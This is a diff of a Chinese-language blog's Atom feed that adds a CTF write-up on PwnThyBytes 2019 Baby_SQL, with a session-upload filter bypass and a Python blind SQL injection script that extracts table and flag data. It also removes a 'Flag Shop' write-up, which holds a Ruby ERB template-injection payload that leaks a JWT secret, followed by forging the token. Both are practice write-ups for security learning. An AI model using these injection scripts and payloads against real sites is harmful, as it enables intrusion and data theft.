@@ -6,10 +6,40 @@
   <link href="http://lll-nnn.github.io/atom.xml" rel="self"/>
   
   <link href="http://lll-nnn.github.io/"/>
-  <updated>2021-09-10T15:03:58.085Z</updated>
+  <updated>2021-09-20T14:15:16.985Z</updated>
   <id>http://lll-nnn.github.io/</id>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>PwnThyBytes 2019 Baby_SQL</title>
+    <link href="http://lll-nnn.github.io/2021/09/20/BUU95/"/>
+    <id>http://lll-nnn.github.io/2021/09/20/BUU95/</id>
+    <published>2021-09-20T13:59:01.000Z</published>
+    <updated>2021-09-20T14:15:16.985Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="PwnThyBytes-2019-Baby-SQL"><a href="#PwnThyBytes-2019-Baby-SQL" class="headerlink" title="[PwnThyBytes 2019]Baby_SQL"></a>[PwnThyBytes 2019]Baby_SQL</h2><p>首页源码由注释<code>/source.zip</code></p><p><code>login.php</code>里的SQL语句<br><img src="https://s3.bmp.ovh/imgs/2021/09/825f257913ec9b01.png">       </p><p>但<code>index.php</code>里有过滤<br><img src="https://s3.bmp.ovh/imgs/2021/09/3ebd4db23b9bee97.png">     </p><p><code>addslashes</code>函数会转义字符<br>有个<code>session_start()</code>函数<br>看WP说可以伪造<code>session</code>直接访问<code>login.php</code>从而绕过<code>index.php</code>中的过滤</p><p><strong>在phpsession里如果在php.ini中设置session.auto_start=On，那么PHP每次处理PHP文件的时候都会自动执行session_start()，但是session.auto_start默认为Off。与Session相关的另一个叫session.upload_progress.enabled，默认为On，在这个选项被打开的前提下我们在multipart POST的时候传入PHP_SESSION_UPLOAD_PROGRESS，PHP会执行session_start()</strong>     </p><pre><code class="hljs python"><span class="hljs-keyword">import</span> requestsurl = <span class="hljs-string">&quot;http://8fa62d49-2408-4b1a-9d2e-6cfb4016a8b0.node4.buuoj.cn:81/templates/login.php&quot;</span>files = &#123;<span class="hljs-string">&quot;file&quot;</span>: <span class="hljs-string">&quot;123456789&quot;</span>&#125;a = requests.post(url=url, files=files, data=&#123;<span class="hljs-string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span>: <span class="hljs-string">&quot;123456789&quot;</span>&#125;,                  cookies=&#123;<span class="hljs-string">&quot;PHPSESSID&quot;</span>: <span class="hljs-string">&quot;test1&quot;</span>&#125;, params=&#123;<span class="hljs-string">&#x27;username&#x27;</span>: <span class="hljs-string">&#x27;test&#x27;</span>, <span class="hljs-string">&#x27;password&#x27;</span>: <span class="hljs-string">&#x27;test&#x27;</span>&#125;,                  proxies=&#123;<span class="hljs-string">&#x27;http&#x27;</span>: <span class="hljs-string">&quot;http://127.0.0.1:8080&quot;</span>&#125;)print(a.text)</code></pre><p>然后在Burp中改<code>username=1&#39;%22%20or%20sleep(4)%23</code>成功延时    </p><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<span class="hljs-keyword">import</span> timefiles=&#123;<span class="hljs-string">&#x27;file&#x27;</span>:<span class="hljs-string">&#x27;1234567&#x27;</span>&#125;url=<span class="hljs-string">&#x27;http://8fa62d49-2408-4b1a-9d2e-6cfb4016a8b0.node4.buuoj.cn:81/templates/login.php&#x27;</span>flag=<span class="hljs-string">&#x27;&#x27;</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">50</span>):    low=<span class="hljs-number">32</span>    high=<span class="hljs-number">128</span>    mid=(low+high)//<span class="hljs-number">2</span>    <span class="hljs-keyword">while</span>(low&lt;high):        time.sleep(<span class="hljs-number">0.6</span>)        payload=<span class="hljs-string">&quot;1&#x27;\&quot; or ascii(substr(database(),&#123;&#125;,1))&gt;&#123;&#125;#&quot;</span>.<span class="hljs-built_in">format</span>(i,mid)        payload_table=<span class="hljs-string">&quot;1&#x27;\&quot; or ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=&#x27;ptbctf&#x27;),&#123;&#125;,1))&gt;&#123;&#125;#&quot;</span>.<span class="hljs-built_in">format</span>(i,mid)        payload_column=<span class="hljs-string">&quot;1&#x27;\&quot; or ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;flag_tbl&#x27;),&#123;&#125;,1))&gt;&#123;&#125;#&quot;</span>.<span class="hljs-built_in">format</span>(i,mid)        payload_data=<span class="hljs-string">&quot;1&#x27;\&quot; or ascii(substr((select group_concat(secret) from ptbctf.flag_tbl),&#123;&#125;,1))&gt;&#123;&#125;#&quot;</span>.<span class="hljs-built_in">format</span>(i,mid)        a=requests.post(url,files=files,                    data=&#123;<span class="hljs-string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>:<span class="hljs-string">&#x27;123456&#x27;</span>&#125;,                    cookies=&#123;<span class="hljs-string">&#x27;PHPSESSID&#x27;</span>:<span class="hljs-string">&#x27;test1&#x27;</span>&#125;,                    params=&#123;<span class="hljs-string">&#x27;username&#x27;</span>:payload,<span class="hljs-string">&#x27;password&#x27;</span>:<span class="hljs-string">&#x27;123123&#x27;</span>&#125;)        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;&lt;meta http-equiv=&quot;refresh&quot; content=&quot;0; url=?p=home&quot; /&gt;&#x27;</span> <span class="hljs-keyword">in</span> a.text:            low=mid+<span class="hljs-number">1</span>        <span class="hljs-keyword">else</span>:            high=mid        mid=(low+high)//<span class="hljs-number">2</span>    <span class="hljs-keyword">if</span>(mid==<span class="hljs-number">32</span> <span class="hljs-keyword">or</span> mid==<span class="hljs-number">128</span>):        <span class="hljs-keyword">break</span>    flag+=<span class="hljs-built_in">chr</span>(mid)    print(flag)</code></pre>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h2 id=&quot;PwnThyBytes-2019-Baby-SQL&quot;&gt;&lt;a href=&quot;#PwnThyBytes-2019-Baby-SQL&quot; class=&quot;headerlink&quot; title=&quot;[PwnThyBytes 2019]Baby_SQL&quot;&gt;&lt;/a&gt;[PwnThyByt</summary>
+      
+    
+    
+    
+    <category term="CTF" scheme="http://lll-nnn.github.io/categories/CTF/"/>
+    
+    <category term="sqli" scheme="http://lll-nnn.github.io/categories/CTF/sqli/"/>
+    
+    
+    <category term="CTF" scheme="http://lll-nnn.github.io/tags/CTF/"/>
+    
+    <category term="WP" scheme="http://lll-nnn.github.io/tags/WP/"/>
+    
+    <category term="sqli" scheme="http://lll-nnn.github.io/tags/sqli/"/>
+    
+  </entry>
   
   <entry>
     <title>BSidesCF 2020 Hurdles</title>
@@ -607,43 +637,6 @@
     <category term="serialize" scheme="http://lll-nnn.github.io/tags/serialize/"/>
     
     <category term="原生类" scheme="http://lll-nnn.github.io/tags/%E5%8E%9F%E7%94%9F%E7%B1%BB/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Flag Shop</title>
-    <link href="http://lll-nnn.github.io/2021/05/04/BUU82/"/>
-    <id>http://lll-nnn.github.io/2021/05/04/BUU82/</id>
-    <published>2021-05-04T13:29:59.000Z</published>
-    <updated>2021-05-04T14:27:04.355Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id=""><a href="#" class="headerlink" title="|_|-|"></a>|_|-|</h2><p>打开环境</p><p><img src="https://img13.360buyimg.com/ddimg/jfs/t1/172950/8/7918/21544/60915946Edcb47200/b52ca327067e551d.png" alt="01.png"></p><p>点一下<code>buy flag</code>     </p><p>弹出了<code>&#123;&quot;title&quot;:&quot;error&quot;,&quot;message&quot;:&quot;no enough jkl&quot;&#125;</code>     </p><p>想到了应该是要伪造cookie     </p><p>顺便看看<code>robots.txt</code>，居然有    </p><pre><code>User-agent: *Disallow: /filebak     </code></pre><p><code>/filebak</code>     </p><pre><code>```rubyrequire &#39;sinatra&#39;require &#39;sinatra/cookies&#39;require &#39;sinatra/json&#39;require &#39;jwt&#39;require &#39;securerandom&#39;require &#39;erb&#39;set :public_folder, File.dirname(__FILE__) + &#39;/static&#39;FLAGPRICE = 1000000000000000000000000000ENV[&quot;SECRET&quot;] = SecureRandom.hex(64)configure do  enable :logging  file = File.new(File.dirname(__FILE__) + &#39;/../log/http.log&#39;,&quot;a+&quot;)  file.sync = true  use Rack::CommonLogger, fileendget &quot;/&quot; do  redirect &#39;/shop&#39;, 302endget &quot;/filebak&quot; do  content_type :text  erb IO.binread __FILE__endget &quot;/api/auth&quot; do  payload = &#123; uid: SecureRandom.uuid , jkl: 20&#125;  auth = JWT.encode payload,ENV[&quot;SECRET&quot;] , &#39;HS256&#39;  cookies[:auth] = authendget &quot;/api/info&quot; do  islogin  auth = JWT.decode cookies[:auth],ENV[&quot;SECRET&quot;] , true, &#123; algorithm: &#39;HS256&#39; &#125;  json(&#123;uid: auth[0][&quot;uid&quot;],jkl: auth[0][&quot;jkl&quot;]&#125;)endget &quot;/shop&quot; do  erb :shopendget &quot;/work&quot; do  islogin  auth = JWT.decode cookies[:auth],ENV[&quot;SECRET&quot;] , true, &#123; algorithm: &#39;HS256&#39; &#125;  auth = auth[0]  unless params[:SECRET].nil?    if ENV[&quot;SECRET&quot;].match(&quot;#&#123;params[:SECRET].match(/[0-9a-z]+/)&#125;&quot;)      puts ENV[&quot;FLAG&quot;]    end  end  if params[:do] == &quot;#&#123;params[:name][0,7]&#125; is working&quot; then    auth[&quot;jkl&quot;] = auth[&quot;jkl&quot;].to_i + SecureRandom.random_number(10)    auth = JWT.encode auth,ENV[&quot;SECRET&quot;] , &#39;HS256&#39;    cookies[:auth] = auth    ERB::new(&quot;&lt;script&gt;alert(&#39;#&#123;params[:name][0,7]&#125; working successfully!&#39;)&lt;/script&gt;&quot;).result  endendpost &quot;/shop&quot; do  islogin  auth = JWT.decode cookies[:auth],ENV[&quot;SECRET&quot;] , true, &#123; algorithm: &#39;HS256&#39; &#125;  if auth[0][&quot;jkl&quot;] &lt; FLAGPRICE then    json(&#123;title: &quot;error&quot;,message: &quot;no enough jkl&quot;&#125;)  else    auth &lt;&lt; &#123;flag: ENV[&quot;FLAG&quot;]&#125;    auth = JWT.encode auth,ENV[&quot;SECRET&quot;] , &#39;HS256&#39;    cookies[:auth] = auth    json(&#123;title: &quot;success&quot;,message: &quot;jkl is good thing&quot;&#125;)  endenddef islogin  if cookies[:auth].nil? then    redirect to(&#39;/shop&#39;)  endend```   </code></pre><p>虽然看不懂是啥，但看到了jwt     </p><p>cookie应该就是jwt了吧     </p><p>解码一下     </p><p><img src="https://img11.360buyimg.com/ddimg/jfs/t1/181071/5/2256/71195/60915948Eaa5fb2dd/e6380093c94ee610.png" alt="02.png">   </p><p>确实，试着用<code>jwtcrack</code>爆破一下secret      </p><p>爆了一会，感觉爆不出来    </p><p>难道不是这个考点    </p><p>回去看那个源码    </p><p>看不懂     </p><p>还是去看WP吧   </p><hr><p>ruby的ERB模板注入     </p><p>主要的代码    </p><pre><code>```rubyget &quot;/work&quot; do  islogin  auth = JWT.decode cookies[:auth],ENV[&quot;SECRET&quot;] , true, &#123; algorithm: &#39;HS256&#39; &#125;  auth = auth[0]  unless params[:SECRET].nil?    if ENV[&quot;SECRET&quot;].match(&quot;#&#123;params[:SECRET].match(/[0-9a-z]+/)&#125;&quot;)      puts ENV[&quot;FLAG&quot;]    end  end  if params[:do] == &quot;#&#123;params[:name][0,7]&#125; is working&quot; then    auth[&quot;jkl&quot;] = auth[&quot;jkl&quot;].to_i + SecureRandom.random_number(10)    auth = JWT.encode auth,ENV[&quot;SECRET&quot;] , &#39;HS256&#39;    cookies[:auth] = auth    ERB::new(&quot;&lt;script&gt;alert(&#39;#&#123;params[:name][0,7]&#125; working successfully!&#39;)&lt;/script&gt;&quot;).result  endend```      </code></pre><p>参数<code>SECRET</code>与真的<code>SECRET</code>匹配，成功则返回flag    </p><p>参数<code>do</code>与<code>name</code>，如果do的值与name的前七位加上<code> is working</code>一样，会弹出<code>&lt;script&gt;alert(&#39;#&#123;params[:name][0,7]&#125; working successfully!&#39;)&lt;/script&gt;</code><br>这里存在模板注入</p><p>REB模板注入的格式<code>&lt;%=7*7%&gt;</code>——-&gt;49      </p><p>然后是ruby中的<a href="https://docs.ruby-lang.org/en/2.4.0/globals_rdoc.html">预定义变量</a>–&gt;<code>$&#39;</code>返回最后一次成功匹配右边的字符串      </p><p>最后一次成功匹配？？？上面那个？？</p><p>构造<code>&lt;%=$&#39;%&gt;</code>正好七位     </p><p>还要hex编码，不知道为什么。。。。。。。       </p><p>payload：<code>/work?SECRET=&amp;name=%3C%25%3D%24%27%25%3E&amp;do=%3C%25%3D%24%27%25%3E%20is%20working</code>     </p><p><img src="https://img14.360buyimg.com/ddimg/jfs/t1/171834/33/7788/70013/60915948Eff3e1215/1de2e42b943ae0db.png" alt="03.png">   </p><p>返回的就是SECRET   </p><p>构造新的jwt    </p><p><img src="https://img13.360buyimg.com/ddimg/jfs/t1/194760/8/1229/73202/60915947E03771f73/f2ef6f29d8c4d0dc.png" alt="04.png"> </p><p>写入cookie     </p><p>flag在返回头的cookie里    </p><p><img src="https://img11.360buyimg.com/ddimg/jfs/t1/180216/2/2292/80981/60915947E137ed448/8c24414f41a9b8de.png" alt="05.png">     </p><p><a href="https://www.anquanke.com/post/id/86867">REB SSTI</a></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h2 id=&quot;&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;headerlink&quot; title=&quot;|_|-|&quot;&gt;&lt;/a&gt;|_|-|&lt;/h2&gt;&lt;p&gt;打开环境&lt;/p&gt;
-&lt;p&gt;&lt;img src=&quot;https://img13.360buyimg.com/ddimg/jfs/t1/17295</summary>
-      
-    
-    
-    
-    <category term="CTF" scheme="http://lll-nnn.github.io/categories/CTF/"/>
-    
-    <category term="jwt" scheme="http://lll-nnn.github.io/categories/CTF/jwt/"/>
-    
-    
-    <category term="CTF" scheme="http://lll-nnn.github.io/tags/CTF/"/>
-    
-    <category term="WP" scheme="http://lll-nnn.github.io/tags/WP/"/>
-    
-    <category term="jwt" scheme="http://lll-nnn.github.io/tags/jwt/"/>
-    
-    <category term="ruby" scheme="http://lll-nnn.github.io/tags/ruby/"/>
-    
-    <category term="ERB" scheme="http://lll-nnn.github.io/tags/ERB/"/>
-    
-    <category term="SSTI" scheme="http://lll-nnn.github.io/tags/SSTI/"/>
     
   </entry>
   
